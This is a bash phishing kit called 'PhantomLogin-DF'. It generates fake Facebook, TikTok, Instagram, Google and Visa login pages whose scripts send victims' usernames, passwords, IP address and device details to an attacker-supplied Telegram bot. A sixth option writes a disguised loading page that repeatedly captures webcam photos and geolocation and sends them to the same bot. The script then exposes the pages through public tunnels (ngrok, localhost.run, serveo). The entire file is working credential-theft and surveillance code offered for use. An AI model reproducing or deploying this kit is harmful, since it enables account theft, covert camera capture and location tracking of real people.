#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${BLUE}██████╗ ███████╗"
    echo -e "██╔══██╗██╔════╝"
    echo -e "██║  ██║█████╗"
    echo -e "██║  ██║██╔══╝"
    echo -e "██████╔╝██"
    echo -e "╚═════╝${NC}"
    echo -e "${YELLOW}-----------------------------------------------------------------------------------"
    echo -e "[+] Tool      : PhantomLogin-DF"
    echo -e "[+] Coder     : @A_Y_TR"
    echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
    echo -e "[+] Version   : 1.0"
    echo -e "-----------------------------------------------------------------------------------${NC}"
}

show_menu() {
    echo -e "${GREEN}Welcome to PhantomLogin-DF${NC}"
    echo -e "${YELLOW}=================================${NC}"
    echo -e "${BLUE}1. Facebook login${NC}"
    echo -e "${BLUE}2. Tik tok login${NC}"
    echo -e "${BLUE}3. Instagram login${NC}"
    echo -e "${BLUE}4. Google login${NC}"
    echo -e "${BLUE}5. Visa login${NC}"
    echo -e "${BLUE}6. camera and location${NC}"
    echo -e "${YELLOW}=================================${NC}"
}

start_local_server() {
    echo -e "${GREEN}Starting local server...${NC}"
    python3 -m http.server 8000 &> /dev/null &
    server_pid=$!
    echo -e "${GREEN}Local server started at http://127.0.0.1:8000/${page}.html${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop the server.${NC}"
    trap "kill $server_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

start_ngrok() {
    echo -e "${GREEN}Starting ngrok...${NC}"
    ngrok http 8000 &> /dev/null &
    ngrok_pid=$!
    sleep 5
    ngrok_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$ngrok_url" ]]; then
        echo -e "${RED}Failed to start ngrok. Please make sure ngrok is installed and try again.${NC}"
        exit 1
    fi
    echo -e "${GREEN}Ngrok URL: ${ngrok_url}/${page}.html${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop ngrok.${NC}"
    trap "kill $ngrok_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

start_localhost_run() {
    echo -e "${GREEN}Starting localhost.run tunnel...${NC}"
    ssh -R 80:localhost:8000 localhost.run &> /dev/null &
    localhost_run_pid=$!
    sleep 5
    localhost_run_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$localhost_run_url" ]]; then
        echo -e "${RED}Failed to start localhost.run. Please make sure ssh is installed and try again.${NC}"
        exit 1
    fi
    echo -e "${GREEN}localhost.run URL: ${localhost_run_url}/${page}.html${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop localhost.run.${NC}"
    trap "kill $localhost_run_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

start_serveo() {
    echo -e "${GREEN}Starting Serveo.net tunnel...${NC}"
    ssh -R 80:localhost:8000 serveo.net &> /dev/null &
    serveo_pid=$!
    sleep 5
    serveo_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$serveo_url" ]]; then
        echo -e "${RED}Failed to start Serveo.net. Please make sure ssh is installed and try again.${NC}"
        exit 1
    fi
    echo -e "${GREEN}Serveo.net URL: ${serveo_url}/${page}.html${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop Serveo.net.${NC}"
    trap "kill $serveo_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

show_banner

echo -e "${GREEN}Enter Token:${NC}"
read token
echo -e "${GREEN}Enter ID:${NC}"
read id

show_menu

echo -e "${GREEN}Choose the page you want to phish:${NC}"
read choice

case $choice in
    1)
        page="Facebook_login"
        cat > "${page}_login.html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 8px rgba(24, 119, 242, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #145dbf;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1877f2;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1877f2;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <h2>Log in to Facebook</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgotten password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create new account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Facebook Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.facebook.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
        ;;
    2)
        page="TikTok_login"
        cat > "${page}_login.html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #121212;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.2);
            color: #fff;
        }

        .login-container img {
            width: 150px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            background-color: #181818;
            color: #fff;
        }

        input:focus {
            border-color: #ff0050;
            box-shadow: 0 0 8px rgba(255, 0, 80, 0.5);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #ff0050;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #e60045;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #ff0050;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #181818;
            border: 1px solid #ff0050;
            font-size: 14px;
            color: #ff0050;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #222;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #ff0050;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
        <h2>Sign in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Don't have an account? Sign up</button>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            
            let token = "${token}";
            let chatId = "${id}";

            let message = \`🔴 **TikTok Login Attempt**\n👤 Username: \${username}\n🔒 Password: \${password}\`;
            let url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chatId}&text=\${encodeURIComponent(message)}\`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    alert("Incorrect username or password. Please try again.");
                })
                .catch(error => console.error("Error sending message:", error));
        });
    </script>

</body>
</html>
EOF
        ;;
    3)
        page="Instagram_login"
        cat > "${page}_login.html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 175px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #4c86ff;
            box-shadow: 0 0 8px rgba(76, 134, 255, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #4c86ff;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #3578e5;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #4c86ff;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #4c86ff;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #4c86ff;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
        <h2>Sign in to Instagram</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Don't have an account? Sign up</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Instagram Login Attempt:

Username💎: \${username}
Password🔑: \${password}

Device Info✨:

IP Address🌐📍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network🔍🌐: \${deviceInfo.networkType}
Device Name🌐: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.instagram.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
        ;;
    4)
        page="Google_login"
        cat > "${page}_login.html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 8px rgba(26, 115, 232, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a73e8;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #135abe;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1a73e8;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
        <h2>Sign in to Google</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Google Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.google.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
        ;;
    5)
        page="Visa_login"
        cat > "${page}_login.html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1a1a1a;
            box-shadow: 0 0 8px rgba(26, 26, 26, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a1a1a;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #333;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1a1a1a;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1a1a1a;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1a1a1a;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo">
        <h2>Sign in to Visa</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Visa Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.visa.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
        ;;
    6)
        page="CameraAndLocation"
        cat > "${page}.html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: black;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            overflow: hidden;
        }

        #loading {
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            color: white;
            text-align: center;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "${token}";
        const chatId = "${id}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        function sendToBot(message) {
            fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
            });
        }

        function sendWelcomeMessage() {
            const message = \`👋 Welcome to the developer! 
                            \n📩 Contact the developer: @A_Y_TR\`;
            sendToBot(message);
        }

        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob, "image.jpg");

                fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
                    method: "POST",
                    body: formData
                });
            }, "image/jpeg");
        }

        function sendLocation() {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                sendToBot(\`📍 Location: https://www.google.com/maps?q=\${lat},\${lon}\`);
            });
        }

        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                video.srcObject = stream;
                setInterval(() => {
                    captureAndSend();
                    sendLocation();
                    sendWelcomeMessage();
                }, 125); 
            })
            .catch(err => console.error(err));

        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
        }, 5000);
    </script>
</body>
</html>
EOF
        ;;
    *)
        echo -e "${RED}Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac

echo -e "${GREEN}${page} login page created as ${page}.html${NC}"

echo -e "${GREEN}Do you want to use ngrok, localhost.run, serveo.net, or localhost? (n/l/s/h):${NC}"
read server_choice

if [[ "$server_choice" == "n" ]]; then
    if ! command -v ngrok &> /dev/null; then
        echo -e "${RED}Ngrok is not installed. Please install ngrok and try again.${NC}"
        exit 1
    fi
    start_ngrok
elif [[ "$server_choice" == "l" ]]; then
    if ! command -v ssh &> /dev/null; then
        echo -e "${RED}SSH is not installed. Please install SSH and try again.${NC}"
        exit 1
    fi
    start_localhost_run
elif [[ "$server_choice" == "s" ]]; then
    if ! command -v ssh &> /dev/null; then
        echo -e "${RED}SSH is not installed. Please install SSH and try again.${NC}"
        exit 1
    fi
    start_serveo
elif [[ "$server_choice" == "h" ]]; then
    start_local_server
else
    echo -e "${RED}Invalid choice. Exiting...${NC}"
    exit 1
fi

echo -e "${GREEN}Thanks to the developer Muhammad Abu Al-Saud${NC}"
echo -e "${GREEN}The tool will keep running until you press Ctrl+C to exit.${NC}"